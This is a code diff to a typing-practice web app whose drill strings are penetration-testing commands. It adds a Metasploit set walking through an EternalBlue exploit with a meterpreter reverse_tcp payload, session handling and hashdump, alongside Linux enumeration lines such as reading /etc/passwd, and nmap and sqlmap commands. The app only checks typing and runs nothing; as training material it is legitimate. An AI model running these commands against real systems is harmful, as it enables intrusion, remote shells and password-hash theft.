@@ -15,7 +15,7 @@ body{
   margin:0;
 }
 .app{
-  width:780px;
+  width:800px;
   background:#111;
   padding:25px;
   border-radius:14px;
@@ -59,6 +59,7 @@ select,button,input{
   <option value="linux">Linux Basics</option>
   <option value="nmap">Nmap</option>
   <option value="sqlmap">SQLmap</option>
+  <option value="metasploit">Metasploit</option>
 </select>
 
 <button id="skipBtn">Skip</button>
@@ -75,30 +76,16 @@ select,button,input{
 /* ===== COMMAND DATABASE ===== */
 const commands = {
 linux:[
-  "whoami",
-  "id",
-  "pwd",
-  "ls -la",
-  "cd /var/www/html",
-  "cat /etc/passwd",
-  "history | tail",
-  "ps aux",
-  "df -h",
-  "du -sh *",
-  "chmod +x exploit.sh",
-  "sudo -l"
+  "whoami","id","pwd","ls -la","cd /var/www/html","cat /etc/passwd",
+  "history | tail","ps aux","df -h","du -sh *","chmod +x exploit.sh","sudo -l"
 ],
 
 nmap:[
-  "nmap 192.168.1.1",
-  "nmap -sS 192.168.1.1",
-  "nmap -sV 192.168.1.1",
-  "nmap -A 192.168.1.1",
-  "nmap -p 22,80,443 192.168.1.1",
+  "nmap 192.168.1.1","nmap -sS 192.168.1.1","nmap -sV 192.168.1.1",
+  "nmap -A 192.168.1.1","nmap -p 22,80,443 192.168.1.1",
   "nmap -p- 192.168.1.1",
   "nmap -sS -sV -O -p 1-65535 192.168.1.1",
-  "nmap --script vuln 192.168.1.1",
-  "nmap -T4 -Pn 192.168.1.1",
+  "nmap --script vuln 192.168.1.1","nmap -T4 -Pn 192.168.1.1",
   "nmap -oN scan.txt 192.168.1.1"
 ],
 
@@ -113,12 +100,41 @@ sqlmap:[
   "sqlmap -r request.txt",
   "sqlmap -r request.txt --dbs",
   "sqlmap -r request.txt --dump",
-  "sqlmap --tamper=space2comment -u http://site.com/index.php?id=1",
-  "sqlmap --os-shell -u http://site.com/index.php?id=1"
+  "sqlmap --tamper=space2comment -u http://site.com/index.php?id=1"
+],
+
+metasploit:[
+  "msfconsole",
+  "help",
+  "search smb",
+  "use exploit/windows/smb/ms17_010_eternalblue",
+  "info",
+  "show options",
+  "show payloads",
+  "set RHOSTS 192.168.1.10",
+  "set RPORT 445",
+  "set LHOST 192.168.1.5",
+  "set LPORT 4444",
+  "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+  "exploit",
+  "run",
+  "sessions",
+  "sessions -i 1",
+  "background",
+  "sysinfo",
+  "getuid",
+  "ps",
+  "shell",
+  "pwd",
+  "ls",
+  "upload file.txt",
+  "download secret.txt",
+  "screenshot",
+  "hashdump"
 ]
 };
 
-/* ===== CORE LOGIC ===== */
+/* ===== CORE LOGIC (stable + locked) ===== */
 let target="", typed="";
 let done=0, total=15, errors=0;
 let locked=false;
@@ -154,22 +170,17 @@ function nextCommand(){
 
 document.getElementById("input").addEventListener("input",e=>{
   if(locked) return;
-
   typed=e.target.value;
   render();
-
   if(!target.startsWith(typed)) errors++;
-
   if(typed===target){
     locked=true;
     done++;
-
     if(done>=total){
       document.getElementById("stats").innerHTML=
         `✔ Session Complete | Accuracy ${Math.max(0,100-errors)}%`;
       return;
     }
-
     setTimeout(nextCommand,500);
   }
 });
